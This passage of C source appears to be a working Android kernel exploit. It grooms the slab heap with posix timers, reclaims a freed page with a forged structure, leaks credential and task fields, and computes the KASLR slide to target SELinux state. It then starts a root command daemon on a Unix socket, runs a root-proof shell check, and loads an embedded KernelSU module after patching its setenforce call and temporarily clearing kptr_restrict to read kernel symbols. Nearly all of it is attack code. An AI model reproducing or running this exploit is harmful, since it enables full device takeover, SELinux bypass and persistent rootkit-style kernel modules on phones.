 int k=(int)(off/0x180);
 printf("PAGE=0x%llx off=0x%llx k=%d N=0x%llx\n",PAGE,off,k,N); if(!g_cred){
  unsigned long long ad2[12],vv2[12];int g2=0;
  ad2[0]=PTASK+0x908;g2=read_addrs(ad2,vv2,1);
  if(g2>0&&vv2[0]){g_cred=vv2[0];
   ad2[0]=g_cred+0x00;ad2[1]=g_cred+0x08;ad2[2]=g_cred+0x18;ad2[3]=g_cred+0x20;ad2[4]=g_cred+0x80;ad2[5]=g_cred+0x28;ad2[6]=g_cred+0x90;ad2[7]=g_cred+0x88;ad2[8]=g_cred+0x98;ad2[9]=g_cred+0xa0;
   g2=read_addrs(ad2,vv2,10);
   printf("CRED cred=0x%llx usage=%llu uid=%llu euid=%llu fsuid=%llu sec=0x%llx sb=0x%llx un=0x%llx user=0x%llx uc=0x%llx gi=0x%llx\n",g_cred,vv2[0],vv2[1],vv2[2],vv2[3],vv2[4],vv2[5],vv2[6],vv2[7],vv2[8],vv2[9]);fflush(stdout);
   g_un=vv2[6];g_sec=vv2[4];g_usr=vv2[7];g_uc=vv2[8];g_gi=vv2[9];
   if(getenv("O3P_SIDFORGE")){unsigned long long sa[3],sv[3];sa[0]=g_sec;sa[1]=g_sec+8;sa[2]=g_sec+0x10;int sg=read_addrs(sa,sv,3);
    if(sg>0){g_secw[0]=sv[0];g_secw[1]=sv[1];g_secw[2]=sv[2];g_sec_ok=1;}
    printf("SECBLOB got=%d w0=0x%llx w1=0x%llx w2=0x%llx\n",sg,sv[0],sv[1],sv[2]);fflush(stdout);}
   if(g_un){unsigned long long sl=g_un-INIT_USER_NS_STATIC;int algn=(int)((sl&0x1fffffULL)==0);
     printf("SLIDE_CALC un=0x%llx slide=0x%llx align=%d\n",g_un,sl,algn);fflush(stdout);}
  } else {printf("CRED_LEAK_FAIL g=%d\n",g2);fflush(stdout);}
 }

 if(!g_fakekva){printf("VERDICT NO_FAKEPAGE\n");benign_cleanup(pid,zombie);return 1;}
 if(k>19||off+0x110ULL>0x1ec0ULL){printf("VERDICT BAD_OFFSET\n");benign_cleanup(pid,zombie);return 1;}
  {int nv=0,nld=0;unsigned long long spv=sp_of(PAGE);
   char*seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
   for(int i=0;i<g_nfs;i++){unsigned long long sp=g_fs[i];if(sp==spv)nv++;
     for(int j=0;j<g_nleak&&j<LEAKMAX;j++){if(!seen[j]&&sp_of(g_leak[j])==sp){seen[j]=1;nld++;break;}}}
   free(seen);
   printf("W1FS fs=%d victim=%d leakpages=%d nleak=%d\n",g_nfs,nv,nld,g_nleak);fflush(stdout);}
   if(g_churn>0){
   pin(0);
   printf("CHURN start slabs=%d n=%d\n",slab_slabs(),g_churn);fflush(stdout);
   timer_t *chtt=(timer_t*)malloc(sizeof(timer_t)*(size_t)g_churn);
   int ncc=0;
   if(chtt){struct sigevent chse;memset(&chse,0,sizeof chse);chse.sigev_notify=SIGEV_NONE;
   for(int ci=0;ci<g_churn;ci++){if(timer_create(CLOCK_MONOTONIC,&chse,&chtt[ci])==0)ncc++;}
   printf("CHURN created=%d slabs=%d\n",ncc,slab_slabs());fflush(stdout);
   for(int ci=0;ci<ncc;ci++)timer_delete(chtt[ci]);
   free(chtt);}
   printf("CHURN deleted slabs=%d\n",slab_slabs());fflush(stdout);
   msleep(g_chwait);
   printf("CHURN afterwait slabs=%d\n",slab_slabs());fflush(stdout);
 }
  mk=0x1a00ULL;MARK=PAGE+mk;
  if(d3_mode()&&g_stage==0){
    if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;}
    g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC);
    if(d3_setup()){printf("VERDICT D3_SETUP\n");benign_cleanup(pid,zombie);return 1;}
    S=d3_S[0];
  } else { if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908; }
printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
 sdlog("FAKEPAGE S=0x%llx\n",S);
 fill_fake_cred(N);
 if(d3_mode()&&g_stage==0)d3_build();else build_pattern();
 sdlog("PAT built\n");
  int hit=0;
  printf("km8k_before=%d posix_before=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  printf("DBG3 leaks=%d delay=%d mode=%d pairs=%d\n",g_nleak,g_delay,g_mode,g_pairs);fflush(stdout);
  probe_on_r("o3p","al","__alloc_frozen_pages_noprof page=$retval:x64");
  printf("cpu_before=%d\n",sched_getcpu());fflush(stdout);
  probe_on("o3p","fs","free_slab cache=%x0:x64 slab=%x1:x64");
  {trunc_trace();wf(TR"/tracing_on","1\n");msleep(g_delay);wf(TR"/tracing_on","0\n");
   size_t tf=read_trace(tbuf,48u<<20);
   {char*s3=0;int nfs=0,nl=0,nv=0;unsigned long long spv0=sp_of(PAGE);
    char *seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
    for(char*line=strtok_r(tbuf,"\n",&s3);line;line=strtok_r(NULL,"\n",&s3)){
      if(strstr(line," fs: (")){unsigned long long sp=field_u64(line,"slab=");if(!sp)continue;nfs++;
        if(sp==spv0)nv++;
        for(int i=0;i<g_nleak&&i<LEAKMAX;i++){if(!seen[i]&&sp_of(g_leak[i])==sp){seen[i]=1;nl++;break;}}
      }
    }
    printf("FREESLAB nfs=%d leakpages=%d victim_fs=%d bytes=%zu\n",nfs,nl,nv,tf);fflush(stdout);
    free(seen);}
  }
  {printf("cpu_after=%d\n",sched_getcpu());fflush(stdout);
   g_nalloc=0;
   trunc_trace();wf(TR"/tracing_on","1\n");
   for(int rp=0;rp<g_reps;rp++){if(g_mode==0)spray_one();else spray_cpus(0,nsv);}
   wf(TR"/tracing_on","0\n");
   size_t tl=read_trace(tbuf,48u<<20);
   {char*s2=0;for(char*line=strtok_r(tbuf,"\n",&s2);line;line=strtok_r(NULL,"\n",&s2)){
      int tid=0;char comm[32];
      if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
      if(strncmp(comm,"yt2-parent",10))continue;
      if(strstr(line," al: (")){unsigned long long v=field_u64(line,"page=");if(v&&g_nalloc<ALMAX)g_alloc[g_nalloc++]=v;}
   }}
   printf("BURST sent=%d alloc=%d bytes=%zu\n",nsv,g_nalloc,tl);fflush(stdout);
   sdlog("SPRAY sent=%d alloc=%d\n",nsv,g_nalloc);
   hit=(d3_mode()&&g_stage==0)?detect_d3():detect_hit();
   sdlog("DETECT hit=%d\n",hit);
   {int lim=g_nleak<512?g_nleak:512;int vm=0,lm=0;unsigned long long spv=sp_of(A);
    for(int j=0;j<g_nalloc;j++){
      if(g_alloc[j]==spv)vm++;
      for(int i=0;i<lim;i++){if(g_alloc[j]==sp_of(g_leak[i])){lm++;break;}}
    }
    printf("ALLOCSTAT ours=%d victim_match=%d leak_match=%d leak_sample=%d\n",g_nalloc,vm,lm,lim);fflush(stdout);}
  }
  printf("km8k_after=%d posix_after=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  int hit2=hit;(void)hit2;
  if(hit)printf("HIT pages=%ld\n",ppages);
  else printf("miss pages=%ld\n",ppages);fflush(stdout);
  sdlog("HITMISS hit=%d pages=%ld\n",hit,ppages);
 { unsigned long long ad[3],vv[3];int n=0;ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=A+0x100;
   int g=read_addrs(ad,vv,n);
   if(g>0){printf("post rb_node=0x%llx next=0x%llx n100=0x%llx\n",vv[0],vv[1],vv[2]);
     if(vv[1]!=N){printf("VERDICT NO_STALE_LINK\n");benign_cleanup(pid,zombie);return 1;}}
   else printf("post read got=%d\n",g); }
  { unsigned long long ad[10],vv[10];int n=0;
    ad[n++]=PAGE;ad[n++]=PAGE+0x100;ad[n++]=PAGE+0x400;ad[n++]=PAGE+0x800;ad[n++]=PAGE+0x1000;ad[n++]=PAGE+0x1800;ad[n++]=PAGE+0x1a00;ad[n++]=PAGE+0x1c00;ad[n++]=A;ad[n++]=A+0x38;
    int g=read_addrs(ad,vv,n);printf("page dump got=%d\n",g);
    if(g>0)for(int k=0;k<n;k++)printf("  D[%d] +0x%llx = 0x%llx\n",k,ad[k]-PAGE,vv[k]);
    printf("SP=0x%llx\n",(0xfffffffec0000000ULL+(((PAGE-0xffffff8000000000ULL)>>12)*0x40ULL)));fflush(stdout);}
 if(!hit){printf("VERDICT NO_RECLAIM\n");benign_cleanup(pid,zombie);return 1;}
 printf("FAKE_TREE_ARMED att=%d pages=%ld\n",att,ppages);fflush(stdout);
 sdlog("ARMED att=%d\n",att);
 *outpid=pid;return 0;
}
/* ---------- reap: trigger stale-node zero write, verify ---------- */
#define ROOTD_SOCK "o3p_rootd"
static void run_sh(const char*cmd,const char*outpath,int waitms){
 pid_t c=fork();
 if(c==0){int fd=open(outpath,O_WRONLY|O_CREAT|O_TRUNC,0666);if(fd>=0){dup2(fd,1);dup2(fd,2);close(fd);}
   execl("/system/bin/sh","sh","-c",cmd,(char*)0);_exit(127);}
 if(c>0){for(int i=0;i<waitms/50;i++){int st;pid_t r=waitpid(c,&st,WNOHANG);if(r==c)break;msleep(50);}}
}
static void read_file_print(const char*path,const char*tag){
 char b[4096];int n=0;int fd=open(path,O_RDONLY);if(fd>=0){n=(int)read(fd,b,sizeof b-1);close(fd);}if(n<0)n=0;b[n]=0;
 printf("%s:[%s]\n",tag,b);fflush(stdout);
}
static int rootd_bind(void){
 int fd=socket(AF_UNIX,SOCK_STREAM,0);
 if(fd<0)return -1;
 struct sockaddr_un a;memset(&a,0,sizeof a);a.sun_family=AF_UNIX;a.sun_path[0]=0;
 strncpy(a.sun_path+1,ROOTD_SOCK,sizeof(a.sun_path)-2);
 socklen_t al=(socklen_t)(offsetof(struct sockaddr_un,sun_path)+1+strlen(ROOTD_SOCK));
 if(bind(fd,(struct sockaddr*)&a,al)<0){printf("ROOTD bind fail errno=%d\n",errno);fflush(stdout);close(fd);return -1;}
 if(listen(fd,8)<0){close(fd);return -1;}
 return fd;
}
static int rootd_connect(void){
 int fd=socket(AF_UNIX,SOCK_STREAM,0);
 if(fd<0)return -1;
 struct sockaddr_un a;memset(&a,0,sizeof a);a.sun_family=AF_UNIX;a.sun_path[0]=0;
 strncpy(a.sun_path+1,ROOTD_SOCK,sizeof(a.sun_path)-2);
 socklen_t al=(socklen_t)(offsetof(struct sockaddr_un,sun_path)+1+strlen(ROOTD_SOCK));
 if(connect(fd,(struct sockaddr*)&a,al)<0){close(fd);return -1;}
 return fd;
}
static int rootd_peer_uid(int fd){
 struct ucred cr; socklen_t cl=sizeof cr;
 if(getsockopt(fd,SOL_SOCKET,SO_PEERCRED,&cr,&cl)<0)return -1;
 return (int)cr.uid;
}
static void rootd_exec(int fd,const char*cmd){
 pid_t c=fork();
 if(c==0){dup2(fd,1);dup2(fd,2);execl("/system/bin/sh","sh","-c",cmd,(char*)0);_exit(127);}
 int st=0,done=0;
 for(int i=0;i<600;i++){pid_t r=waitpid(c,&st,WNOHANG);if(r==c){done=1;break;}msleep(50);}
 if(!done){kill(c,SIGKILL);dprintf(fd,"\n__EXIT=-1\n");return;}
 dprintf(fd,"\n__EXIT=%d\n",WIFEXITED(st)?WEXITSTATUS(st):-1);
}
static void rootd_main(void){
 {int lf=open("/data/local/tmp/o3p_rootd.log",O_WRONLY|O_CREAT|O_APPEND,0600);if(lf>=0){dup2(lf,1);dup2(lf,2);close(lf);}}
 printf("ROOTD start pid=%d uid=%d euid=%d sock=@%s\n",(int)getpid(),(int)getuid(),(int)geteuid(),ROOTD_SOCK);fflush(stdout);
 int srv=rootd_bind(); if(srv<0)return;
 printf("ROOTD listening\n");fflush(stdout);
 for(;;){
  int c=accept(srv,0,0);
  if(c<0){msleep(30);continue;}
  int uid=rootd_peer_uid(c);
  if(uid!=0&&uid!=2000){dprintf(c,"ERR denied uid=%d\n",uid);close(c);continue;}
  char cmd[1024];int n=0;char ch;
  while(n<(int)sizeof(cmd)-1){ssize_t r=read(c,&ch,1);if(r<=0)break;if(ch=='\n')break;cmd[n++]=ch;}
  cmd[n]=0;
  if(n==0){close(c);continue;}
  rootd_exec(c,cmd);
  close(c);
 }
}
static int rootd_client(const char*cmd){
 int fd=rootd_connect();
 if(fd<0){printf("CLIENT connect fail errno=%d\n",errno);fflush(stdout);return 1;}
 dprintf(fd,"%s\n",cmd);shutdown(fd,SHUT_WR);
 char b[4096];ssize_t n;
 while((n=read(fd,b,sizeof b-1))>0){b[n]=0;fputs(b,stdout);}
 close(fd);
 return 0;
}
static void rootd_cmd(const char*cmd){
 int fd=rootd_connect();
 if(fd<0){printf("ROOTD_OUT:[connect fail errno=%d]\n",errno);fflush(stdout);return;}
 dprintf(fd,"%s\n",cmd);shutdown(fd,SHUT_WR);
 char b[4096];ssize_t n;
 printf("ROOTD_OUT:[");fflush(stdout);
 while((n=read(fd,b,sizeof b-1))>0){b[n]=0;fputs(b,stdout);}
 printf("]\n");fflush(stdout);
 close(fd);
}
static void rootd_start(void){
 pid_t c=fork();
 if(c==0){execl(g_self,"o3p","--rootd",(char*)0);_exit(127);}
 printf("ROOTD fork=%d self=%s\n",(int)c,g_self);fflush(stdout);
 for(int i=0;i<40;i++){int fd=rootd_connect();if(fd>=0){close(fd);printf("ROOTD sock ready\n");fflush(stdout);break;}msleep(100);}
}
static void root_proof(void){
 printf("== ROOT PROOF\n");fflush(stdout);
 run_sh("id; echo ---; grep -E '^(Uid|Gid|CapEff|CapPrm|CapBnd):' /proc/self/status; echo ---; getenforce; echo ---; cat /proc/sys/kernel/random/boot_id","/data/local/tmp/o3p_proof.txt",4000);
 read_file_print("/data/local/tmp/o3p_proof.txt","PROOFFILE");
}

/* ==== KernelSU LKM: runtime relink + finit_module ==== */
#define KSU_SHN_ABS 0xfff1
static int g_relink_skip_syms=0;

static void stage_note(const char *s){
  int fd=open("/data/local/tmp/o3p_stage.txt",O_WRONLY|O_CREAT|O_APPEND,0644);
  if(fd<0)return;
  char b[192]; int n=snprintf(b,sizeof b,"%s\n",s);
  if(n>0)write(fd,b,n);
  fsync(fd); close(fd);
}

#define KSU_TAG_TIANN 1
#define KSU_TAG_NEXT 2
#define KSU_TAG_SUKISU 3
static int g_ksu_tag = 0;
static const char *g_ksu_fork = "?";

static int ksu_have_pkg(const char *pkg) {
  char pat[256];
  glob_t g;
  int has = 0;
  snprintf(pat, sizeof pat, "/data/app/*/%s-*", pkg);
  if (glob(pat, 0, NULL, &g) == 0) { has = (g.gl_pathc > 0); globfree(&g); }
  if (!has) {
    snprintf(pat, sizeof pat, "/data/app/*/%s", pkg);
    if (glob(pat, 0, NULL, &g) == 0) { has = (g.gl_pathc > 0); globfree(&g); }
  }
  return has;
}

static void ksu_detect_fork(void) {
  const char *e = getenv("O3P_KSU_FORK");
  if (e && *e) {
    if (!strcmp(e, "tiann")) { g_ksu_tag = KSU_TAG_TIANN; g_ksu_fork = "tiann"; }
    else if (!strcmp(e, "next")) { g_ksu_tag = KSU_TAG_NEXT; g_ksu_fork = "next"; }
    else if (!strcmp(e, "sukisu")) { g_ksu_tag = KSU_TAG_SUKISU; g_ksu_fork = "sukisu"; }
    if (g_ksu_tag) {
      printf("KSU_FORK chosen=%s tag=%d src=env\n", g_ksu_fork, g_ksu_tag);
      fflush(stdout);
      return;
    }
  }
  if (ksu_have_pkg("me.weishu.kernelsu")) { g_ksu_tag = KSU_TAG_TIANN; g_ksu_fork = "tiann"; }
  else if (ksu_have_pkg("com.rifsxd.ksunext")) { g_ksu_tag = KSU_TAG_NEXT; g_ksu_fork = "next"; }
  else if (ksu_have_pkg("com.sukisu.ultra")) { g_ksu_tag = KSU_TAG_SUKISU; g_ksu_fork = "sukisu"; }
  else { g_ksu_tag = KSU_TAG_TIANN; g_ksu_fork = "tiann(default)"; }
  printf("KSU_FORK chosen=%s tag=%d src=scan\n", g_ksu_fork, g_ksu_tag);
  fflush(stdout);
}

static unsigned char *ksu_read_range(int fd, unsigned long long off, unsigned long long len) {
  if (len == 0 || len > (8u << 20)) return NULL;
  unsigned char *b = (unsigned char *)malloc((size_t)len);
  if (!b) return NULL;
  if (lseek(fd, (off_t)off, SEEK_SET) != (off_t)off) { free(b); return NULL; }
  unsigned long long got = 0;
  while (got < len) {
    ssize_t r = read(fd, b + got, (size_t)(len - got));
    if (r <= 0) break;
    got += (unsigned long long)r;
  }
  if (got != len) { free(b); return NULL; }
  return b;
}

static unsigned char *ksu_blob_load(size_t *plen) {
  int fd = open("/proc/self/exe", O_RDONLY);
  if (fd < 0) return NULL;
  off_t end = lseek(fd, 0, SEEK_END);
  if (end < 24) { close(fd); return NULL; }

  /* v2: [payload][ko ...][table 24*n][magic "O3KSKM02"][u32 n] */
  if (end >= 12) {
    struct { char m[8]; unsigned int n; } t2;
    if (lseek(fd, (off_t)end - 12, SEEK_SET) == (off_t)end - 12 &&
        read(fd, &t2, sizeof t2) == (ssize_t)sizeof t2 &&
        !memcmp(t2.m, "O3KSKM02", 8) && t2.n >= 1 && t2.n <= 8) {
      unsigned long long tbl = (unsigned long long)end - 12 - (unsigned long long)t2.n * 24;
      if (tbl > 0) {
        unsigned char *e = ksu_read_range(fd, tbl, (unsigned long long)t2.n * 24);
        if (e) {
          if (!g_ksu_tag) ksu_detect_fork();
          unsigned long long boff = 0, blen = 0;
          int btag = 0, cnt = (int)t2.n, chosen = 0;
          for (unsigned k = 0; k < t2.n; k++) {
            unsigned int tag = 0;
            unsigned long long o = 0, l = 0;
            memcpy(&tag, e + k * 24, 4);
            memcpy(&o, e + k * 24 + 8, 8);
            memcpy(&l, e + k * 24 + 16, 8);
            if (l == 0 || o + l > tbl) continue;
            if (!btag) { boff = o; blen = l; btag = (int)tag; }
            if ((int)tag == g_ksu_tag) { boff = o; blen = l; btag = (int)tag; chosen = 1; break; }
          }
          free(e);
          if (btag) {
            unsigned char *b = ksu_read_range(fd, boff, blen);
            if (b) {
              close(fd);
              printf("KSU_BLOB v2 tag=%d len=%llu count=%d matched=%d\n",
                     btag, blen, cnt, chosen);
              fflush(stdout);
              *plen = (size_t)blen;
              return b;
            }
          }
        }
      }
    }
  }

  /* v1 (legacy): last 24 bytes = magic + payload_len + ko_len */
  struct ksu_trailer { char m[8]; unsigned long long off, len; } tr;
  if (lseek(fd, (off_t)(end - (off_t)sizeof tr), SEEK_SET) != (off_t)(end - (off_t)sizeof tr)) { close(fd); return NULL; }
  if (read(fd, &tr, sizeof tr) != (ssize_t)sizeof tr) { close(fd); return NULL; }
  if (memcmp(tr.m, "O3KSKO01", 8) || tr.len == 0 || tr.len > (8u << 20) ||
      tr.off + (unsigned long long)tr.len > (unsigned long long)end) { close(fd); return NULL; }
  unsigned char *b = ksu_read_range(fd, tr.off, tr.len);
  close(fd);
  if (!b) return NULL;
  printf("KSU_BLOB v1 len=%llu\n", tr.len);
  fflush(stdout);
  *plen = tr.len;
  return b;
}

static int ksu_patch(unsigned char *d,size_t len,unsigned long long slide){
  if(nocodepatch_mode()){printf("KSU_CODEPATCH skip\n");fflush(stdout);return 0;}
  unsigned long long shoff; unsigned short shentsize=0,shnum=0;
  if(len<64||d[0]!=0x7f||d[1]!='E')return -1;
  memcpy(&shoff,d+0x28,8); memcpy(&shentsize,d+0x3a,2); memcpy(&shnum,d+0x3c,2);
  if(shentsize<64||shnum==0||shnum>64)return -2;
  if(shoff+(unsigned long long)shentsize*shnum>len)return -3;
  int found=0,missing=0,strs=0;
  for(int i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize;
    unsigned int type; memcpy(&type,sh+4,4);
    if(type!=2||g_relink_skip_syms)continue;
    unsigned long long soff,ssize,entsize; unsigned int link;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    if(entsize<24||link>=shnum||soff+ssize>len)return -4;
    unsigned char *shr=d+shoff+(size_t)link*shentsize;
    unsigned long long stoff,stsize;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    if(stoff+stsize>len)return -5;
    const char *str=(const char*)(d+stoff);
    size_t n=(size_t)(ssize/entsize);
    for(size_t k=0;k<n;k++){
      unsigned char *s=d+soff+k*entsize;
      unsigned int nameoff; memcpy(&nameoff,s,4);
      unsigned short shndx; memcpy(&shndx,s+6,2);
      if(shndx!=0||nameoff==0||nameoff>=stsize)continue;
      const char *nm=str+nameoff;
      int hit=-1;
      for(int j=0;j<KSU_SYM_COUNT;j++){ if(!strcmp(ksu_syms[j].name,nm)){hit=j;break;} }
      if(hit<0){missing++;continue;}
      unsigned short abs=KSU_SHN_ABS; memcpy(s+6,&abs,2);
      unsigned long long v=ksu_syms[hit].addr+slide; memcpy(s+8,&v,8);
      found++;
    }
    strs++;
  }
  { unsigned int shstrndx=0; memcpy(&shstrndx,d+0x3e,2);
    int cd_patch=-1; unsigned long long cd_off=0;
    unsigned int init_idx=0xffffffffu; unsigned long long init_off=0,init_size=0;
    if(shstrndx<shnum){ unsigned char *shs=d+shoff+(size_t)shstrndx*shentsize; unsigned long long so=0,ss=0;
      memcpy(&so,shs+0x18,8); memcpy(&ss,shs+0x20,8);
      if(so+ss<=len) for(unsigned i2=0;i2<shnum;i2++){ unsigned char *sh2=d+shoff+(size_t)i2*shentsize; unsigned int no2=0; memcpy(&no2,sh2,4);
        if(no2>=ss)continue; const char *nm2=(const char*)(d+so+no2);
        if(strcmp(nm2,".init.text"))continue;
        memcpy(&init_off,sh2+0x18,8); memcpy(&init_size,sh2+0x20,8); init_idx=i2; break; } }
    if(init_idx!=0xffffffffu){
      for(unsigned i2=0;i2<shnum;i2++){
        unsigned char *sh2=d+shoff+(size_t)i2*shentsize; unsigned int type2=0; memcpy(&type2,sh2+4,4);
        if(type2!=4)continue;
        unsigned int info2=0; memcpy(&info2,sh2+0x2c,4);
        if(info2!=init_idx)continue;
        unsigned int link2=0; memcpy(&link2,sh2+0x28,4);
        unsigned long long roff=0,rsize=0,rentsize=24; memcpy(&roff,sh2+0x18,8); memcpy(&rsize,sh2+0x20,8); memcpy(&rentsize,sh2+0x38,8);
        if(rentsize<24||link2>=shnum||roff+rsize>len)continue;
        unsigned char *symh=d+shoff+(size_t)link2*shentsize; unsigned long long syoff=0,sysize=0,syentsize=24;
        memcpy(&syoff,symh+0x18,8); memcpy(&sysize,symh+0x20,8); memcpy(&syentsize,symh+0x38,8);
        if(syentsize<24||syoff+sysize>len)continue;
        unsigned int strlink=0; memcpy(&strlink,symh+0x28,4);
        if(strlink>=shnum)continue;
        unsigned char *strh=d+shoff+(size_t)strlink*shentsize; unsigned long long stroff=0,strsize=0;
        memcpy(&stroff,strh+0x18,8); memcpy(&strsize,strh+0x20,8);
        if(stroff+strsize>len)continue;
        const char *strtab=(const char*)(d+stroff);
        size_t nr=(size_t)(rsize/rentsize);
        for(size_t k=0;k<nr;k++){
          unsigned char *re=d+roff+k*rentsize; unsigned long long r_off=0,r_info=0;
          memcpy(&r_off,re,8); memcpy(&r_info,re+8,8);
          unsigned int symidx=(unsigned int)(r_info>>32);
          if((unsigned long long)symidx*syentsize+(unsigned long long)syentsize>sysize)continue;
          unsigned int nmoff=0; memcpy(&nmoff,d+syoff+(unsigned long long)symidx*syentsize,4);
          if(nmoff==0||nmoff>=strsize)continue;
          if(strcmp(strtab+nmoff,"setenforce"))continue;
          if(r_off<4||r_off>init_size)continue;
          { unsigned long long cand=init_off+(r_off-4);
            if(cand+4<=len){ unsigned char *q2=d+cand;
              if(q2[0]==0x20&&q2[1]==0x00&&q2[2]==0x80&&q2[3]==0x52){ q2[0]=0x00; cd_patch=1; cd_off=cand; }
              else if(cd_patch<0){ cd_patch=-2; cd_off=cand; } } }
          if(cd_patch==1)break;
        }
        if(cd_patch==1)break;
      }
      if(cd_patch<0){ int hits=0; unsigned long long hitoff=0;
        if(init_off+init_size<=len) for(unsigned long long p=0;p+8<=init_size;p++){
          unsigned char *q=d+init_off+p;
          if(q[0]==0x20&&q[1]==0x00&&q[2]==0x80&&q[3]==0x52){ unsigned int w=0; memcpy(&w,q+4,4);
            if((w&0xfc000000u)==0x94000000u){ hits++; hitoff=init_off+p; } } }
        if(hits==1){ unsigned char *q2=d+hitoff; if(q2[0]==0x20&&q2[1]==0x00&&q2[2]==0x80&&q2[3]==0x52){ q2[0]=0x00; cd_patch=1; cd_off=hitoff; } }
      }
    }
    printf("KSU_CODEPATCH mov_w0_zero=%d off=0x%llx",cd_patch,cd_off);putchar(10);fflush(stdout);
    {char m2[128];snprintf(m2,sizeof m2,"KSU_CODEPATCH r=%d off=0x%llx",cd_patch,cd_off);stage_note(m2);} }
  printf("KSU_PATCH symtabs=%d found=%d missing=%d skip=%d\n",strs,found,missing,g_relink_skip_syms);fflush(stdout);
  {char m[96];snprintf(m,sizeof m,"KSU_PATCH_OK found=%d missing=%d",found,missing);stage_note(m);}
  return g_relink_skip_syms?0:(found>0?0:-6);
}

static void ksu_modlist(void){
  int fd=open("/proc/modules",O_RDONLY);
  if(fd<0){printf("KSU_MODULE UNKNOWN\n");fflush(stdout);return;}
  char b[8192]; ssize_t n=read(fd,b,sizeof b-1); close(fd);
  if(n<=0){printf("KSU_MODULE UNKNOWN\n");fflush(stdout);return;}
  b[n]=0;
  printf("KSU_MODULE %s\n",strstr(b,"kernelsu")?"LIVE":"ABSENT");fflush(stdout);
}


/* ---- dynamic loader: resolve UNDEF via /proc/kallsyms (kptr_restrict cleared temporarily) ---- */
struct ksym_t { char name[128]; unsigned long long addr; int used; };
static unsigned ksym_hash(const char *s){ unsigned h=5381u; while(*s){h=h*33u^(unsigned char)*s++;} return h; }
static int kptr_get(void){ int fd=open("/proc/sys/kernel/kptr_restrict",O_RDONLY); if(fd<0)return -1; char b[16]; int n=(int)read(fd,b,15); close(fd); if(n<=0)return -1; b[n]=0; return atoi(b); }
static int kptr_set(int v){ int fd=open("/proc/sys/kernel/kptr_restrict",O_WRONLY); if(fd<0)return -1; char b[16]; int n=snprintf(b,sizeof b,"%d\n",v) ; ssize_t w=write(fd,b,(size_t)n); close(fd); return w==n?0:-1; }
static int kallsyms_patch(unsigned char *d,size_t len,int *pfound,int *pmissing){
  static struct ksym_t tab[2048];
  memset(tab,0,sizeof tab);
  if(len<64||d[0]!=0x7f)return -1;
  unsigned long long shoff; unsigned short shentsize=0,shnum=0;
  memcpy(&shoff,d+0x28,8); memcpy(&shentsize,d+0x3a,2); memcpy(&shnum,d+0x3c,2);
  if(shentsize<64||shnum==0||shnum>64)return -2;
  if(shoff+(unsigned long long)shentsize*shnum>len)return -3;
  int tcount=0,found=0,missing=0,i,k;
  for(i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize; unsigned int type=0; memcpy(&type,sh+4,4);
    if(type!=2)continue;
    unsigned long long soff=0,ssize=0,entsize=24; unsigned int link=0;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    if(entsize<24||link>=shnum||soff+ssize>len)continue;
    unsigned char *shr=d+shoff+(size_t)link*shentsize; unsigned long long stoff=0,stsize=0;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    if(stoff+stsize>len)continue;
    const char *str=(const char*)(d+stoff);
    size_t n=(size_t)(ssize/entsize);
    for(size_t kk=0;kk<n;kk++){
      unsigned char *sy=d+soff+kk*entsize; unsigned int no=0; unsigned short shndx=0;
      memcpy(&no,sy,4); memcpy(&shndx,sy+6,2);
      if(shndx!=0||no==0||no>=stsize)continue;
      const char *nm=str+no; unsigned h=ksym_hash(nm)&2047u; int slot=-1;
      for(k=0;k<8;k++){ unsigned idx=(h+(unsigned)k)&2047u; if(!tab[idx].used){slot=(int)idx;break;} if(!strcmp(tab[idx].name,nm)){slot=(int)idx;break;} }
      if(slot<0||tcount>=2000)return -7;
      if(!tab[slot].used){ tab[slot].used=1; snprintf(tab[slot].name,sizeof tab[slot].name,"%s",nm); tab[slot].addr=0; tcount++; }
    }
  }
  int old=kptr_get(); if(old<0)return -8;
  if(old!=0 && kptr_set(0))return -8;
  { FILE *f=fopen("/proc/kallsyms","r"); if(!f){ if(old!=0)kptr_set(old); return -9; }
    char line[512];
    while(fgets(line,sizeof line,f)){
      unsigned long long a=0; char t=0; char nm[130];
      if(sscanf(line,"%llx %c %129s",&a,&t,nm)!=3)continue;
      if(!a)continue;
      unsigned h=ksym_hash(nm)&2047u;
      for(k=0;k<8;k++){ unsigned idx=(h+(unsigned)k)&2047u; if(!tab[idx].used)break; if(!strcmp(tab[idx].name,nm)){ if(!tab[idx].addr)tab[idx].addr=a; break; } }
    }
    fclose(f);
  }
  if(old!=0)kptr_set(old);
  for(i=0;i<2048;i++) if(tab[i].used&&!tab[i].addr) missing++;
  for(i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize; unsigned int type=0; memcpy(&type,sh+4,4);
    if(type!=2)continue;
    unsigned long long soff=0,ssize=0,entsize=24; unsigned int link=0;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    unsigned char *shr=d+shoff+(size_t)link*shentsize; unsigned long long stoff=0,stsize=0;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    const char *str=(const char*)(d+stoff);
